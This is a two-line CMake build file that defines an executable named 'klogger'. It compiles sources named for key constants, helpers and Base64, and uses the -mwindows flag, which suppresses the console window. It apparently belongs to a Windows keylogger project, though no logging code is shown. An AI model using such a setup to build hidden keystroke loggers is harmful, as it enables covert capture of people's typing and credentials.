set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -mwindows")

add_executable(klogger main.cpp KeyConstants.cpp Helper.cpp Base64.cpp)